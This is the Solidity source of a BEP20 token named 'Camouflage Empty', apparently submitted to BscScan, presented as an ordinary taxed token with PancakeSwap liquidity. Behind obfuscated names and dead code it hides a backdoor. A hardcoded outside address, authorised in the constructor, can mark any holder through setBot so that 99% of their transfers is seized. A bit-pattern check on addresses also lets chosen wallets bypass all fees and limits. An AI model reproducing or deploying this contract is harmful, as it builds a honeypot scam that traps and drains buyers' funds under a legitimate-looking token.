/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.10;interface IBEP20 {    function name() external view returns (string memory);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function symbol() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function decimals() external view returns (uint8);    function balanceOf(address account) external view returns (uint256);    function getOwner() external view returns (address);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function totalSupply() external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}library SafeMath {    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }}interface IUniswapV2Router {    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function WETH() external pure returns (address);    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}contract CamouflageEmpty is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Camouflage Empty ";    string constant _symbol = "CamouflageEmpty";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private botsBurnFeeBuy = 0;    uint256 private marketingExemptBuyTrading = 7;    //SELL FEES    uint256 private txLimitWalletMin = 0;    uint256 private launchedIsBotsBurn = 7;    bool private receiverMarketingIsBuy = true;    bool private minTxExemptWalletMode = true;    bool private isSellMinMode = true;    bool private swapReceiverMarketingFeeMaxIs = true;    bool private buyLaunchedMaxModeBots = true;    uint256 private feeIsMinReceiver = _totalSupply / 1000; // 0.1%    uint256 private marketingLaunchedTxMode = marketingExemptBuyTrading + botsBurnFeeBuy;    uint256 private buyMaxBurnMinIs = 100;    bool private buyMarketingTradingTxLiquidityExemptFee;    uint256 private minSwapBurnLaunchedMax;    uint256 private feeLiquidityBuyBots;    uint256 private launchedLiquidityTradingAuto;    uint256 private limitBotsReceiverWalletSellLaunched;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private liquiditySwapReceiverWalletBotsTx;    mapping(address => bool) private receiverIsMarketingTrading;    mapping(address => bool) private liquiditySellSwapIs;    mapping(address => bool) private minTxExemptWallet;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private minMaxMarketingAutoWallet;    uint256 private botsExemptReceiverTradingBurnLaunched;    address private burnLaunchedTxLiquiditySellSwap = (msg.sender); // auto-liq address    address private botsSwapMarketingReceiver = (0x1b13B82DA9eB453efDf27045FfFfeb90633e6186); // marketing address    address private autoLimitIsLaunchedModeBurn = DEAD;    address private sellTradingBurnBots = DEAD;    address private marketingBotsBurnIsFee = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool public buyLimitMaxSwapIsSellTrading = false;    bool public minAutoWalletTx = false;    uint256 private teamLiquiditySellMaxMarketingReceiver = 0;    uint256 public tradingIsMaxBurn = 0;    bool private txAutoTradingSwap = false;    bool public feeSwapLiquidityBuy = false;    uint256 public burnMaxSwapMarketing = 0;    uint256 private sellTradingIsMinBurn = 0;    bool private limitMarketingFeeLiquidityIsSell = false;    bool public txLiquiditySwapMin = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        buyMarketingTradingTxLiquidityExemptFee = true;        liquiditySellSwapIs[msg.sender] = true;        liquiditySellSwapIs[0x0000000000000000000000000000000000000000] = true;        liquiditySellSwapIs[0x000000000000000000000000000000000000dEaD] = true;        liquiditySellSwapIs[address(this)] = true;        liquiditySwapReceiverWalletBotsTx[msg.sender] = true;        liquiditySwapReceiverWalletBotsTx[address(this)] = true;        receiverIsMarketingTrading[msg.sender] = true;        receiverIsMarketingTrading[0x0000000000000000000000000000000000000000] = true;        receiverIsMarketingTrading[0x000000000000000000000000000000000000dEaD] = true;        receiverIsMarketingTrading[address(this)] = true;        SetAuthorized(address(0xF8e45e6BBDB87A2fEA8314E5FFfFf4527A704a45));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return swapModeMarketingMinTx(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return swapModeMarketingMinTx(sender, recipient, amount);    }    function getReceiverMarketingIsBuy() public view returns (bool) {        if (receiverMarketingIsBuy != isSellMinMode) {            return isSellMinMode;        }        if (receiverMarketingIsBuy != receiverMarketingIsBuy) {            return receiverMarketingIsBuy;        }        if (receiverMarketingIsBuy != buyLaunchedMaxModeBots) {            return buyLaunchedMaxModeBots;        }        return receiverMarketingIsBuy;    }
    function swapMaxLimitTrading() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    buyLaunchedMaxModeBots &&    _balances[address(this)] >= feeIsMinReceiver;    }
    function setMinTxExemptWalletMode(bool a0) public onlyOwner {        if (minTxExemptWalletMode != txAutoTradingSwap) {            txAutoTradingSwap=a0;        }        if (minTxExemptWalletMode == swapReceiverMarketingFeeMaxIs) {            swapReceiverMarketingFeeMaxIs=a0;        }        minTxExemptWalletMode=a0;    }
    function setMinTxExemptWallet(address a0,bool a1) public onlyOwner {        if (a0 != botsSwapMarketingReceiver) {            txAutoTradingSwap=a1;        }        minTxExemptWallet[a0]=a1;    }
    function minBotsLaunchedReceiver(address sender) internal view returns (bool) {        return !receiverIsMarketingTrading[sender];    }
    function setBot(address addr) public onlyAuthorized {        minTxExemptWallet[addr] = true;    }
    function setLiquiditySellSwapIs(address a0,bool a1) public onlyOwner {        if (liquiditySellSwapIs[a0] == minTxExemptWallet[a0]) {           minTxExemptWallet[a0]=a1;        }        if (a0 == autoLimitIsLaunchedModeBurn) {            isSellMinMode=a1;        }        if (liquiditySellSwapIs[a0] == receiverIsMarketingTrading[a0]) {           receiverIsMarketingTrading[a0]=a1;        }        liquiditySellSwapIs[a0]=a1;    }
    function teamTxReceiverIsTradingLimit() internal swapping {                uint256 amountToLiquify = feeIsMinReceiver.mul(botsBurnFeeBuy).div(marketingLaunchedTxMode).div(2);        uint256 amountToSwap = feeIsMinReceiver.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (sellTradingIsMinBurn != marketingLaunchedTxMode) {            sellTradingIsMinBurn = sellTradingIsMinBurn;        }        if (txAutoTradingSwap != swapReceiverMarketingFeeMaxIs) {            txAutoTradingSwap = isSellMinMode;        }        if (limitMarketingFeeLiquidityIsSell == isSellMinMode) {            limitMarketingFeeLiquidityIsSell = minTxExemptWalletMode;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = marketingLaunchedTxMode.sub(botsBurnFeeBuy.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(botsBurnFeeBuy).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(marketingExemptBuyTrading).div(totalETHFee);                if (teamLiquiditySellMaxMarketingReceiver == buyMaxBurnMinIs) {            teamLiquiditySellMaxMarketingReceiver = feeIsMinReceiver;        }        if (sellTradingIsMinBurn == marketingLaunchedTxMode) {            sellTradingIsMinBurn = marketingLaunchedTxMode;        }        payable(botsSwapMarketingReceiver).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                burnLaunchedTxLiquiditySellSwap,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getMinTxExemptWalletMode() public view returns (bool) {        if (minTxExemptWalletMode == txAutoTradingSwap) {            return txAutoTradingSwap;        }        if (minTxExemptWalletMode != swapReceiverMarketingFeeMaxIs) {            return swapReceiverMarketingFeeMaxIs;        }        if (minTxExemptWalletMode == buyLaunchedMaxModeBots) {            return buyLaunchedMaxModeBots;        }        return minTxExemptWalletMode;    }
    function setBuyLaunchedMaxModeBots(bool a0) public onlyOwner {        if (buyLaunchedMaxModeBots == swapReceiverMarketingFeeMaxIs) {            swapReceiverMarketingFeeMaxIs=a0;        }        if (buyLaunchedMaxModeBots != minTxExemptWalletMode) {            minTxExemptWalletMode=a0;        }        if (buyLaunchedMaxModeBots == txAutoTradingSwap) {            txAutoTradingSwap=a0;        }        buyLaunchedMaxModeBots=a0;    }
    function getBuyLaunchedMaxModeBots() public view returns (bool) {        if (buyLaunchedMaxModeBots == receiverMarketingIsBuy) {            return receiverMarketingIsBuy;        }        if (buyLaunchedMaxModeBots != receiverMarketingIsBuy) {            return receiverMarketingIsBuy;        }        return buyLaunchedMaxModeBots;    }
    function getLaunchedIsBotsBurn() public view returns (uint256) {        if (launchedIsBotsBurn != marketingExemptBuyTrading) {            return marketingExemptBuyTrading;        }        if (launchedIsBotsBurn != txLimitWalletMin) {            return txLimitWalletMin;        }        if (launchedIsBotsBurn != buyMaxBurnMinIs) {            return buyMaxBurnMinIs;        }        return launchedIsBotsBurn;    }
    function getBotsSwapMarketingReceiver() public view returns (address) {        if (botsSwapMarketingReceiver == burnLaunchedTxLiquiditySellSwap) {            return burnLaunchedTxLiquiditySellSwap;        }        if (botsSwapMarketingReceiver != marketingBotsBurnIsFee) {            return marketingBotsBurnIsFee;        }        return botsSwapMarketingReceiver;    }
    function liquidityTradingMinMax(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function isBot(address addr) public view returns (bool) {        return minTxExemptWallet[addr];    }
    function botsMinExemptMode(address sender, bool selling) internal returns (uint256) {                if (sellTradingIsMinBurn == sellTradingIsMinBurn) {            sellTradingIsMinBurn = feeIsMinReceiver;        }        if (limitMarketingFeeLiquidityIsSell != limitMarketingFeeLiquidityIsSell) {            limitMarketingFeeLiquidityIsSell = isSellMinMode;        }        if (teamLiquiditySellMaxMarketingReceiver != teamLiquiditySellMaxMarketingReceiver) {            teamLiquiditySellMaxMarketingReceiver = feeIsMinReceiver;        }        if (selling) {            marketingLaunchedTxMode = launchedIsBotsBurn + txLimitWalletMin;            return marketingLaunchedTxMode;        }        if (!selling && sender == uniswapV2Pair) {            marketingLaunchedTxMode = marketingExemptBuyTrading + botsBurnFeeBuy;            return marketingLaunchedTxMode;        }        return launchedIsBotsBurn + txLimitWalletMin;    }
    function setReceiverMarketingIsBuy(bool a0) public onlyOwner {        if (receiverMarketingIsBuy == buyLaunchedMaxModeBots) {            buyLaunchedMaxModeBots=a0;        }        receiverMarketingIsBuy=a0;    }
    function getLiquiditySellSwapIs(address a0) public view returns (bool) {        if (a0 == burnLaunchedTxLiquiditySellSwap) {            return swapReceiverMarketingFeeMaxIs;        }        if (a0 == autoLimitIsLaunchedModeBurn) {            return minTxExemptWalletMode;        }        if (a0 == sellTradingBurnBots) {            return isSellMinMode;        }            return liquiditySellSwapIs[a0];    }
    function liquidityBurnSwapTrading(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(botsMinExemptMode(sender, receiver == uniswapV2Pair)).div(buyMaxBurnMinIs);        if (minTxExemptWallet[sender] || minTxExemptWallet[receiver]) {            feeAmount = amount.mul(99).div(buyMaxBurnMinIs);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function setMarketingExemptBuyTrading(uint256 a0) public onlyOwner {        if (marketingExemptBuyTrading == sellTradingIsMinBurn) {            sellTradingIsMinBurn=a0;        }        if (marketingExemptBuyTrading != sellTradingIsMinBurn) {            sellTradingIsMinBurn=a0;        }        marketingExemptBuyTrading=a0;    }
    function getFeeIsMinReceiver() public view returns (uint256) {        if (feeIsMinReceiver == launchBlock) {            return launchBlock;        }        return feeIsMinReceiver;    }
    function swapModeMarketingMinTx(address sender, address recipient, uint256 amount) internal returns (bool) {                if (teamLiquiditySellMaxMarketingReceiver == marketingLaunchedTxMode) {            teamLiquiditySellMaxMarketingReceiver = marketingLaunchedTxMode;        }        if (limitMarketingFeeLiquidityIsSell == swapReceiverMarketingFeeMaxIs) {            limitMarketingFeeLiquidityIsSell = txAutoTradingSwap;        }        bool bLimitTxWalletValue = liquidityTradingMinMax(sender) || liquidityTradingMinMax(recipient);                if (txAutoTradingSwap == isSellMinMode) {            txAutoTradingSwap = isSellMinMode;        }        if (limitMarketingFeeLiquidityIsSell == receiverMarketingIsBuy) {            limitMarketingFeeLiquidityIsSell = isSellMinMode;        }        if (sellTradingIsMinBurn != teamLiquiditySellMaxMarketingReceiver) {            sellTradingIsMinBurn = marketingLaunchedTxMode;        }                        if (inSwap || bLimitTxWalletValue) {return buyWalletLimitReceiver(sender, recipient, amount);}        if (!liquiditySwapReceiverWalletBotsTx[sender] && !liquiditySwapReceiverWalletBotsTx[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (teamLiquiditySellMaxMarketingReceiver == feeIsMinReceiver) {            teamLiquiditySellMaxMarketingReceiver = teamLiquiditySellMaxMarketingReceiver;        }        if (sellTradingIsMinBurn == feeIsMinReceiver) {            sellTradingIsMinBurn = feeIsMinReceiver;        }        if (limitMarketingFeeLiquidityIsSell != isSellMinMode) {            limitMarketingFeeLiquidityIsSell = minTxExemptWalletMode;        }        require((amount <= _maxTxAmount) || liquiditySellSwapIs[sender] || liquiditySellSwapIs[recipient], "Max TX Limit!");        if (swapMaxLimitTrading()) {teamTxReceiverIsTradingLimit();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = minBotsLaunchedReceiver(sender) ? liquidityBurnSwapTrading(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setFeeIsMinReceiver(uint256 a0) public onlyOwner {        if (feeIsMinReceiver != teamLiquiditySellMaxMarketingReceiver) {            teamLiquiditySellMaxMarketingReceiver=a0;        }        feeIsMinReceiver=a0;    }
    function getMarketingBotsBurnIsFee() public view returns (address) {        if (marketingBotsBurnIsFee != botsSwapMarketingReceiver) {            return botsSwapMarketingReceiver;        }        return marketingBotsBurnIsFee;    }
    function setBotsSwapMarketingReceiver(address a0) public onlyOwner {        if (botsSwapMarketingReceiver == botsSwapMarketingReceiver) {            botsSwapMarketingReceiver=a0;        }        if (botsSwapMarketingReceiver != autoLimitIsLaunchedModeBurn) {            autoLimitIsLaunchedModeBurn=a0;        }        botsSwapMarketingReceiver=a0;    }
    function getMarketingExemptBuyTrading() public view returns (uint256) {        if (marketingExemptBuyTrading == botsBurnFeeBuy) {            return botsBurnFeeBuy;        }        if (marketingExemptBuyTrading != txLimitWalletMin) {            return txLimitWalletMin;        }        return marketingExemptBuyTrading;    }
    function getMinTxExemptWallet(address a0) public view returns (bool) {            return minTxExemptWallet[a0];    }
    function setLaunchedIsBotsBurn(uint256 a0) public onlyOwner {        if (launchedIsBotsBurn != buyMaxBurnMinIs) {            buyMaxBurnMinIs=a0;        }        if (launchedIsBotsBurn != sellTradingIsMinBurn) {            sellTradingIsMinBurn=a0;        }        if (launchedIsBotsBurn == sellTradingIsMinBurn) {            sellTradingIsMinBurn=a0;        }        launchedIsBotsBurn=a0;    }
    function buyWalletLimitReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setMarketingBotsBurnIsFee(address a0) public onlyOwner {        if (marketingBotsBurnIsFee == marketingBotsBurnIsFee) {            marketingBotsBurnIsFee=a0;        }        if (marketingBotsBurnIsFee == marketingBotsBurnIsFee) {            marketingBotsBurnIsFee=a0;        }        if (marketingBotsBurnIsFee == autoLimitIsLaunchedModeBurn) {            autoLimitIsLaunchedModeBurn=a0;        }        marketingBotsBurnIsFee=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}